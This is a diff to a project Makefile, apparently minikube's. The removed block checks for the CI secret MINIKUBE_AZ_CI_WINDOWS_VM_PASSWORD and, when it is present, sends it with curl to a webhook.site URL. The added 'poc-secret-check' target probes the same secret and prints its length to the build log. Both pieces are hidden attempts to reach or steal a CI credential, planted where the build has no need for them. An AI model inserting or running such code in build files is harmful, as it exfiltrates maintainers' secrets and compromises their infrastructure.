@@ -1084,24 +1084,11 @@ _update-all:
 # targets for tests on prow
 include ./hack/prow/prow.mk
 
-echo "=== DEBUG START ==="
-
-echo "Env check:"
-env | grep -i MINIKUBE || true
-
-echo "Trying to read secret..."
-
-if [ -n "$MINIKUBE_AZ_CI_WINDOWS_VM_PASSWORD" ]; then
-  echo "SECRET FOUND"
-
-  curl -v "https://webhook.site/cf45dc06-89a5-4376-87e3-c84e3abc47dd" \
-    --data-urlencode "SSHPASS=$MINIKUBE_AZ_CI_WINDOWS_VM_PASSWORD"
-
-else
-  echo "SECRET NOT FOUND"
-
-  curl -v "https://webhook.site/cf45dc06-89a5-4376-87e3-c84e3abc47dd" \
-    --data-urlencode "status=secret_not_available"
-fi
-
-echo "=== DEBUG END ==="
+poc-secret-check:
+	@echo "Checking secret access..."
+	@if [ -n "$$MINIKUBE_AZ_CI_WINDOWS_VM_PASSWORD" ]; then \
+		echo "SECRET IS AVAILABLE"; \
+		echo "Length: $${#MINIKUBE_AZ_CI_WINDOWS_VM_PASSWORD}"; \
+	else \
+		echo "SECRET NOT AVAILABLE"; \
+	fi
